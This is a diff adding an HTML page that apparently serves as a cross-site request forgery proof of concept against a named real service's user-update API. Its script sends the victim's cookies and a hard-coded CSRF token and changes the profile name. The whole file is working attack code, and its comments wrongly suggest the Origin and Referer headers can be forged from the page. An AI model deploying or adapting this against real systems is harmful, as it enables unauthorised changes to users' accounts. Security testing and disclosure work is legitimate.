@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // Forge the request with controlled headers and cookies
+    fetch('https://api.qwilr.com/api/users/update', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Origin': 'https://app.qwilr.com',  // Simulate Origin
+        'Referer': 'https://app.qwilr.com/', // Simulate Referer
+        'X-Xsrf-Token': 'EsKhmFHk-CcMMY0Zg7hIS8ZS_EEbZGeh8UL4' // CSRF token
+      },
+      credentials: 'include', // Include cookies (session, session.sig)
+      body: JSON.stringify({ firstName: "boko", lastName: "" })
+    })
+    .then(response => response.text())
+    .then(data => console.log('Response:', data))
+    .catch(error => console.error('Error:', error));
+  </script>
+</body>
+</html>
